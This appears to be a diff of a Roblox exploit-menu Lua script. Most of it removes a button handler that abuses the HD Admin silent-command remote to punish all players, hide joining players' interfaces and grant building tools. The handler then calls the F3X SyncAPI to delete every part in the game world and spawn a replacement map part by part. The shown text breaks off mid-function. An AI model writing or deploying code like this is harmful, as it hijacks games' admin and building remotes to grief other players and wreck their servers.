@@ -21,7 +21,7 @@ G2L["2"] = Instance.new("Frame", G2L["1"]);
 G2L["2"]["BorderSizePixel"] = 6;
 G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["2"]["Size"] = UDim2.new(0, 546, 0, 477);
-G2L["2"]["Position"] = UDim2.new(0.39992, 0, 0.05503, 0);
+G2L["2"]["Position"] = UDim2.new(0.09029, 0, 0.06008, 0);
 G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 255);
 G2L["2"]["Name"] = [[FLUAframe]];
 G2L["2"]["BackgroundTransparency"] = 0.25;
@@ -13661,2337 +13661,8 @@ task.spawn(C_107);
 -- StarterGui.ScreenGui.FLUAframe.LeakMapsPage.map4.LocalScript
 local function C_109()
 local script = G2L["109"];
-	--[[
-		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-	]]
-	-- F3X MAP BUILDER v5.2  [Chunk 1/1]  Parts: 160/160
-	
-	local ReplicatedStorage = game:GetService("ReplicatedStorage")
-	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
-	local Players = game:GetService("Players")
 	script.Parent.MouseButton1Up:Connect(function()
-	Players.PlayerAdded:Connect(function(player)
-		wait(0.4) 
-		RequestCommand:InvokeServer(";hideguis " .. player.Name)
-	end)
-	RequestCommand:InvokeServer(";btools me")
-	RequestCommand:InvokeServer(";fogcolor black")
-	wait(0.4)
-	RequestCommand:InvokeServer(";punish all")
-	wait(0.1)
-	
-	local player = game.Players.LocalPlayer
-	local char = player.Character
-	local backpack = player.Backpack
-	
-	local function getf3x()
-		for _, v in ipairs(backpack:GetChildren()) do
-			if v:FindFirstChild("SyncAPI") then return v end
-		end
-		for _, v in ipairs(char:GetChildren()) do
-			if v:FindFirstChild("SyncAPI") then return v end
-		end
-		return nil
-	end
-	
-	local f3x = getf3x()
-	if not f3x then warn("F3X not found!") return end
-	local syncapi = f3x.SyncAPI
-	local serverendpoint = syncapi.ServerEndpoint
-	
-	local function resize(part,size,cf)
-		serverendpoint:InvokeServer(unpack({[1]="SyncResize",[2]={[1]={["Part"]=part,["CFrame"]=cf,["Size"]=size}}}))
-	end
-	
-	local function syncmaterial(part,mate)
-		serverendpoint:InvokeServer(unpack({[1]="SyncMaterial",[2]={[1]={["Part"]=part,["Material"]=mate}}}))
-	end
-	
-	local function transparency(part,trans)
-		serverendpoint:InvokeServer(unpack({[1]="SyncMaterial",[2]={[1]={["Part"]=part,["Transparency"]=trans}}}))
-	end
-	
-	local function color(part,col)
-		serverendpoint:InvokeServer(unpack({[1]="SyncColor",[2]={[1]={["Part"]=part,["Color"]=col,["UnionColoring"]=false}}}))
-	end
-	
-	local function setanchor(part,b)
-		serverendpoint:InvokeServer(unpack({[1]="SyncAnchor",[2]={[1]={["Part"]=part,["Anchored"]=b}}}))
-	end
-	
-	local function setcollision(part,b)
-		serverendpoint:InvokeServer(unpack({[1]="SyncCollision",[2]={[1]={["Part"]=part,["CanCollide"]=b}}}))
-	end
-	
-	local function setlock(part,b)
-		serverendpoint:InvokeServer(unpack({[1]="SetLocked",[2]={[1]=part},[3]=b}))
-	end
-	
-	local function setname(part,n)
-		serverendpoint:InvokeServer(unpack({[1]="SetName",[2]={[1]=part},[3]=n}))
-	end
-	
-	local function createdecal(part,side)
-		serverendpoint:InvokeServer(unpack({[1]="CreateTextures",[2]={[1]={["Part"]=part,["Face"]=side,["TextureType"]="Decal"}}}))
-	end
-	
-	local function setdecal(part,asset,side)
-		serverendpoint:InvokeServer(unpack({[1]="SyncTexture",[2]={[1]={["Part"]=part,["Face"]=side,["TextureType"]="Decal",["Texture"]="rbxassetid://"..asset}}}))
-	end
-	
-	local function makemesh(part)
-		serverendpoint:InvokeServer(unpack({[1]="CreateMeshes",[2]={[1]={["Part"]=part}}}))
-	end
-	
-	local function syncmeshid(part,id)
-		serverendpoint:InvokeServer(unpack({[1]="SyncMesh",[2]={[1]={["Part"]=part,["MeshId"]="rbxassetid://"..id}}}))
-	end
-	
-	local function syncmeshtexture(part,id)
-		serverendpoint:InvokeServer(unpack({[1]="SyncMesh",[2]={[1]={["Part"]=part,["TextureId"]="rbxassetid://"..id}}}))
-	end
-	
-	local function syncmeshsize(part,v)
-		serverendpoint:InvokeServer(unpack({[1]="SyncMesh",[2]={[1]={["Part"]=part,["Scale"]=v}}}))
-	end
-	
-	for _, v in ipairs(workspace:GetDescendants()) do
-		if v:IsA("BasePart") or v:IsA("UnionOperation") or v:IsA("MeshPart") then
-			spawn(function() serverendpoint:InvokeServer(unpack({[1]="Remove",[2]={[1]=v}})) end)
-		end
-	end
-	wait(1.5)
-	
-	local TOTAL = 160
-	local done = 0
-	local errors = 0
-	local spawnRef = nil
-	print("[MAP] Chunk 1/1: building " .. TOTAL .. " parts...")
-	
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-177.4053955078125,59.174407958984375,15.581619262695312),workspace)
-			resize(pt,Vector3.new(2.200038433074951,29.767112731933594,2.199962615966797),CFrame.new(-177.4053955078125,59.174407958984375,15.581619262695312)*CFrame.Angles(math.rad(0),math.rad(-179.72000122070312),math.rad(-90)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Smooth Block Model")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-174.68191528320312,50.599403381347656,24.981399536132812),workspace)
-			resize(pt,Vector3.new(0.44999998807907104,17.39996337890625,9.899884223937988),CFrame.new(-174.68191528320312,50.599403381347656,24.981399536132812)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(105,102,92))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-190.84523010253906,45.174339294433594,-0.8253293037414551),workspace)
-			resize(pt,Vector3.new(0.05000000074505806,9.149999618530273,4),CFrame.new(-190.84523010253906,45.174339294433594,-0.8253293037414551)*CFrame.Angles(math.rad(0),math.rad(-179.81199645996094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(205,205,205))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"0",Enum.NormalId.Left)
-			transparency(pt,0.5)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-191.00694274902344,50.94933319091797,-0.8247377872467041),workspace)
-			resize(pt,Vector3.new(0.05000000074505806,1.1999990940093994,1.2000004053115845),CFrame.new(-191.00694274902344,50.94933319091797,-0.8247377872467041)*CFrame.Angles(math.rad(0),math.rad(-179.81199645996094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(205,205,205))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"52625339",Enum.NormalId.Left)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-190.80056762695312,44.099334716796875,-2.3750228881835938),workspace)
-			resize(pt,Vector3.new(0.05000000074505806,2,0.800000011920929),CFrame.new(-190.80056762695312,44.099334716796875,-2.3750228881835938)*CFrame.Angles(math.rad(0),math.rad(-179.81199645996094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(163,162,165))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"http://www.roblox.com/asset/?id=43479241",Enum.NormalId.Left)
-			transparency(pt,0.800000011920929)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-190.79551696777344,41.19933319091797,-0.8252062201499939),workspace)
-			resize(pt,Vector3.new(0.05000000074505806,1.2000001668930054,3.9000000953674316),CFrame.new(-190.79551696777344,41.19933319091797,-0.8252062201499939)*CFrame.Angles(math.rad(0),math.rad(-179.81199645996094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(163,162,165))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"http://www.roblox.com/asset/?id=43479241",Enum.NormalId.Left)
-			transparency(pt,0.800000011920929)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-190.74342346191406,45.174346923828125,20.024417877197266),workspace)
-			resize(pt,Vector3.new(0.05000000074505806,9.149999618530273,4),CFrame.new(-190.74342346191406,45.174346923828125,20.024417877197266)*CFrame.Angles(math.rad(0),math.rad(-179.81199645996094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(205,205,205))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"0",Enum.NormalId.Left)
-			transparency(pt,0.5)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-190.74342346191406,50.94933319091797,20.024478912353516),workspace)
-			resize(pt,Vector3.new(0.05000000074505806,1.1999990940093994,1.2000004053115845),CFrame.new(-190.74342346191406,50.94933319091797,20.024478912353516)*CFrame.Angles(math.rad(0),math.rad(-179.81199645996094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(205,205,205))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"52625339",Enum.NormalId.Left)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-190.7300262451172,44.099334716796875,18.474796295166016),workspace)
-			resize(pt,Vector3.new(0.05000000074505806,2,0.800000011920929),CFrame.new(-190.7300262451172,44.099334716796875,18.474796295166016)*CFrame.Angles(math.rad(0),math.rad(-179.81199645996094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(163,162,165))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"http://www.roblox.com/asset/?id=43479241",Enum.NormalId.Left)
-			transparency(pt,0.800000011920929)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-190.6934356689453,41.19933319091797,20.024539947509766),workspace)
-			resize(pt,Vector3.new(0.05000000074505806,1.2000001668930054,3.9000000953674316),CFrame.new(-190.6934356689453,41.19933319091797,20.024539947509766)*CFrame.Angles(math.rad(0),math.rad(-179.81199645996094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(163,162,165))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"http://www.roblox.com/asset/?id=43479241",Enum.NormalId.Left)
-			transparency(pt,0.800000011920929)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-170.86651611328125,60.624725341796875,-7.200714111328125),workspace)
-			resize(pt,Vector3.new(1.1000374555587769,0.05000000074505806,1.100000023841858),CFrame.new(-170.86651611328125,60.624725341796875,-7.200714111328125)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(180)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(254,243,187))
-			setanchor(pt,true)
-			setname(pt,"Smooth Block Model")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-170.79098510742188,60.624725341796875,8.299072265625),workspace)
-			resize(pt,Vector3.new(1.1000374555587769,0.05000000074505806,1.100000023841858),CFrame.new(-170.79098510742188,60.624725341796875,8.299072265625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(180)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(254,243,187))
-			setanchor(pt,true)
-			setname(pt,"Smooth Block Model")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-170.7894287109375,57.29932403564453,8.5999755859375),workspace)
-			resize(pt,Vector3.new(1.600000023841858,6.500000476837158,1.600000023841858),CFrame.new(-170.7894287109375,57.29932403564453,8.5999755859375)*CFrame.Angles(math.rad(0),math.rad(0.28200000524520874),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(248,248,248))
-			setanchor(pt,true)
-			setname(pt,"Light")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-145.48968505859375,57.29932403564453,8.476409912109375),workspace)
-			resize(pt,Vector3.new(1.600000023841858,6.500000476837158,1.600000023841858),CFrame.new(-145.48968505859375,57.29932403564453,8.476409912109375)*CFrame.Angles(math.rad(0),math.rad(0.28200000524520874),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(248,248,248))
-			setanchor(pt,true)
-			setname(pt,"Light")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-127.30029296875,64.14939880371094,0.624664306640625),workspace)
-			resize(pt,Vector3.new(47.79981994628906,6.899966239929199,1.9998958110809326),CFrame.new(-127.30029296875,64.14939880371094,0.624664306640625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Front)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Front)
-			transparency(pt,0.800000011920929)
-			createdecal(pt,Enum.NormalId.Right)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Right)
-			transparency(pt,0.800000011920929)
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Left)
-			transparency(pt,0.800000011920929)
-			createdecal(pt,Enum.NormalId.Back)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Back)
-			transparency(pt,0.800000011920929)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-170.283203125,43.57438659667969,-36.000518798828125),workspace)
-			resize(pt,Vector3.new(2.400000810623169,1.549999475479126,1.899999737739563),CFrame.new(-170.283203125,43.57438659667969,-36.000518798828125)*CFrame.Angles(math.rad(0),math.rad(-29.72100067138672),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(160,86,36))
-			setanchor(pt,true)
-			setname(pt,"Wedge")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-170.2584228515625,40.849395751953125,-36.043914794921875),workspace)
-			resize(pt,Vector3.new(23.149789810180664,0.49997109174728394,1.9998939037322998),CFrame.new(-170.2584228515625,40.849395751953125,-36.043914794921875)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-169.16793823242188,41.64940643310547,-37.95458984375),workspace)
-			resize(pt,Vector3.new(3.899998664855957,1.0999999046325684,1.350000262260437),CFrame.new(-169.16793823242188,41.64940643310547,-37.95458984375)*CFrame.Angles(math.rad(0),math.rad(-29.72100067138672),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(160,86,36))
-			setanchor(pt,true)
-			setname(pt,"Wedge")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-170.2459716796875,41.64939880371094,-36.065887451171875),workspace)
-			resize(pt,Vector3.new(23.199798583984375,1.099971055984497,2.3998937606811523),CFrame.new(-170.2459716796875,41.64939880371094,-36.065887451171875)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(160,86,36))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-185.92086791992188,44.099334716796875,-26.468719482421875),workspace)
-			resize(pt,Vector3.new(0.05000000074505806,2,0.800000011920929),CFrame.new(-185.92086791992188,44.099334716796875,-26.468719482421875)*CFrame.Angles(math.rad(0),math.rad(-89.81099700927734),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(163,162,165))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"http://www.roblox.com/asset/?id=43479241",Enum.NormalId.Left)
-			transparency(pt,0.800000011920929)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-184.371337890625,45.174346923828125,-26.455352783203125),workspace)
-			resize(pt,Vector3.new(0.05000000074505806,9.149999618530273,4),CFrame.new(-184.371337890625,45.174346923828125,-26.455352783203125)*CFrame.Angles(math.rad(0),math.rad(-89.81099700927734),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(205,205,205))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"0",Enum.NormalId.Left)
-			transparency(pt,0.5)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-184.37115478515625,41.19933319091797,-26.505279541015625),workspace)
-			resize(pt,Vector3.new(0.05000000074505806,1.2000001668930054,3.9000000953674316),CFrame.new(-184.37115478515625,41.19933319091797,-26.505279541015625)*CFrame.Angles(math.rad(0),math.rad(-89.81099700927734),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(163,162,165))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"http://www.roblox.com/asset/?id=43479241",Enum.NormalId.Left)
-			transparency(pt,0.800000011920929)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-168.04754638671875,50.599403381347656,-60.15203857421875),workspace)
-			resize(pt,Vector3.new(0.44999998807907104,17.39996337890625,9.899884223937988),CFrame.new(-168.04754638671875,50.599403381347656,-60.15203857421875)*CFrame.Angles(math.rad(0),math.rad(-89.72100067138672),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(105,102,92))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-167.42019653320312,43.774383544921875,-41.015594482421875),workspace)
-			resize(pt,Vector3.new(11.949799537658691,0.15000000596046448,2.799894094467163),CFrame.new(-167.42019653320312,43.774383544921875,-41.015594482421875)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(188,155,93))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-181.68173217773438,50.59941101074219,-26.160125732421875),workspace)
-			resize(pt,Vector3.new(0.599822998046875,20.199966430664062,13.499890327453613),CFrame.new(-181.68173217773438,50.59941101074219,-26.160125732421875)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Front)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Front)
-			transparency(pt,0.800000011920929)
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Left)
-			transparency(pt,0.800000011920929)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-178.76571655273438,57.29932403564453,-47.9617919921875),workspace)
-			resize(pt,Vector3.new(1.600000023841858,6.500000476837158,1.600000023841858),CFrame.new(-178.76571655273438,57.29932403564453,-47.9617919921875)*CFrame.Angles(math.rad(0),math.rad(0.28200000524520874),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(248,248,248))
-			setanchor(pt,true)
-			setname(pt,"Light")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-178.76568603515625,60.624717712402344,-47.962799072265625),workspace)
-			resize(pt,Vector3.new(1.1000374555587769,0.05000000074505806,1.100000023841858),CFrame.new(-178.76568603515625,60.624717712402344,-47.962799072265625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(180)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(254,243,187))
-			setanchor(pt,true)
-			setname(pt,"Smooth Block Model")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-178.71932983398438,57.29932403564453,-38.4619140625),workspace)
-			resize(pt,Vector3.new(1.600000023841858,6.500000476837158,1.600000023841858),CFrame.new(-178.71932983398438,57.29932403564453,-38.4619140625)*CFrame.Angles(math.rad(0),math.rad(0.28200000524520874),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(248,248,248))
-			setanchor(pt,true)
-			setname(pt,"Light")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-178.71929931640625,60.624725341796875,-38.462921142578125),workspace)
-			resize(pt,Vector3.new(1.1000374555587769,0.05000000074505806,1.100000023841858),CFrame.new(-178.71929931640625,60.624725341796875,-38.462921142578125)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(180)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(254,243,187))
-			setanchor(pt,true)
-			setname(pt,"Smooth Block Model")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-177.6334228515625,59.174407958984375,-31.1177978515625),workspace)
-			resize(pt,Vector3.new(2.200038433074951,29.767112731933594,2.199962615966797),CFrame.new(-177.6334228515625,59.174407958984375,-31.1177978515625)*CFrame.Angles(math.rad(0),math.rad(-179.72000122070312),math.rad(-90)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Smooth Block Model")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-133.17953491210938,55.69938659667969,25.37852668762207),workspace)
-			resize(pt,Vector3.new(11.100000381469727,2.250267744064331,7.899999618530273),CFrame.new(-133.17953491210938,55.69938659667969,25.37852668762207)*CFrame.Angles(math.rad(-90),math.rad(0.27900001406669617),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(163,162,165))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Bottom)
-			setdecal(pt,"4012608266",Enum.NormalId.Bottom)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-167.61837768554688,42.94939422607422,-40.668792724609375),workspace)
-			resize(pt,Vector3.new(12.649802207946777,1.4999711513519287,2.3998939990997314),CFrame.new(-167.61837768554688,42.94939422607422,-40.668792724609375)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(160,86,36))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-173.65447998046875,44.274383544921875,-30.09490966796875),workspace)
